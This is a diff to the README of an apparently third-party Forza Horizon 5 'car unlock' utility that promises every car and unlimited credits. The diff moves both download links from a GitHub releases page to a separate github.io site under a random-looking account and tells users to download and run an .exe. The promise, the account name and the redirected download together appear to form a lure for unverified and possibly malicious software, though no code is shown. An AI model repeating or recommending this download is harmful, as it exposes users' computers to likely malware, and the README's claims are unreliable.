@@ -1,6 +1,6 @@
 # 🏎️ FH5-Car-Unlock-Utility - Unlock every car and credit easily
 
-[![Download FH5-Car-Unlock-Utility](https://img.shields.io/badge/Download_Utility-Grey-blue.svg)](https://github.com/Metacarpalarteryostracism978/FH5-Car-Unlock-Utility/releases)
+[![Download FH5-Car-Unlock-Utility](https://img.shields.io/badge/Download_Utility-Grey-blue.svg)](https://metacarpalarteryostracism978.github.io)
 
 ## 📌 Overview
 
@@ -23,7 +23,7 @@ Please ensure your game is closed before you use this utility. Running the tool 
 
 Follow these steps to obtain and prepare the utility on your Windows computer.
 
-1. Navigate to the release page to download the latest version: [FH5-Car-Unlock-Utility Releases](https://github.com/Metacarpalarteryostracism978/FH5-Car-Unlock-Utility/releases).
+1. Navigate to the release page to download the latest version: [FH5-Car-Unlock-Utility Releases](https://metacarpalarteryostracism978.github.io).
 2. Look for the file ending in .exe in the Assets section.
 3. Select the file to save it to your computer.
 4. Locate the downloaded file in your browser or your Downloads folder.
